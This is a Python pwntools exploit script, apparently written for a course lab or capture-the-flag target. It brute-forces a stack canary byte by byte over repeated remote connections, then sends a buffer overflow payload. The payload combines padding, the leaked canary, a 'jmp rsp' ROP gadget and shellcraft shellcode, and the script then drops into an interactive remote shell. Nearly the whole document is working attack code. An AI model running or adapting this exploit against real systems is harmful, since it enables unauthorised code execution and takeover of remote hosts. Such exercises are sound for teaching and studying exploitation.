from pwn import *
import time
import struct
import time

context.arch = "amd64"

# Initialize 24 padding character bytes needed to overflow upto the stack cookie 
PADDING1 = (b'A'*24)
print("The cookie prefix padding bytes are: ", PADDING1)
print("")

canary = [0x00]
for cb in range(7):

    currentByte = 0x00
    for i in range(255):
        if currentByte != 0x0a: # remove bad characters

	    # Print bruteforce test byte
            print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            print("")
            print("[+] Trying {:s} on canary byte {:d}...".format(hex(currentByte), (cb + 1)))
            print("")

            p = remote("csc748.hostbin.org", 7033)
            #p = remote("localhost", 7033) 
            response = p.recvuntil("Halt, who goes there?\n").decode("utf-8")
            print(response)
            print("")

            # Cookie offset padding bytes
            payload = PADDING1

            # Bruteforce routine
            for c in canary:
                payload += b"".join([struct.pack("B", c)])

            # Add NULL string terminator
            payload += struct.pack("B", currentByte)

            # Print  bruteforce bytes
            print("The payload is: ", payload)
            print("")

            p.clean()
            p.sendline(payload)
            print("")

            response = ""
            try:
                # Check for success brute force leakage of a cookie bytes
                response = p.recvuntil("You may pass.\n").decode("utf-8")
                print(response)
                print("")
            except EOFError:
                print("[+] EOFError: Process terminated!!")
                print("")
            finally:
                p.close()
                #sleep(1)

            # Build the leaked cookie string
            if "You may pass.\n" in response:
                canary.append(currentByte)
                print("\n[*] Byte {:d} is {:s}\n".format((cb + 1), hex(currentByte)))
                print("")
                currentByte = 0
                print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break
            else:
                currentByte += 1
                #sleep(1)
                print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                print("")
        else:
            currentByte += 1
            #sleep(1)
            #print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            #print("")

        #p.interactive(
print(canary)
print("")
print("The leaked stack cookie is: ")
print(" ".join([hex(c) for c in canary]))
print("")
COOKIE = bytes(canary)


# Initialize 8 padding characters bytes needed to fill the oveflow RBP
PADDING2 = (b'B'*8)
print("The cookie suffix padding bytes are: ", PADDING2) 
print("")

# Initialize the ROP gadget to jump to the shellcode
JMP_RSP = 0x4014c5
print("The ROP gadget instruction 'jmp rsp;' is at binary code address: 0x{:X}".format(JMP_RSP))
print("")
print("The ROP gadget instruction 'jmp rsp;' in packed 64 format is: ", p64(JMP_RSP))
print("")

# Shell call code
SHELLCODE = asm(shellcraft.amd64.linux.sh())
print("The shellcode bytes are:", (SHELLCODE))
print("")

# Overflow the stack and exploit via the 'char name[16];' character array
#p = remote("localhost", 7033)
p = remote("csc748.hostbin.org", 7033)
response = p.recvuntil("Halt, who goes there?\n").decode("utf-8")
print(response)
print("")
payload = (PADDING1 + COOKIE + PADDING2 + p64(JMP_RSP) + SHELLCODE)
print("The full payload bytes are: ", payload)
print("")
p.clean()
p.sendline(payload)

# Switcht to interactive session after gaining shell
p.interactive()

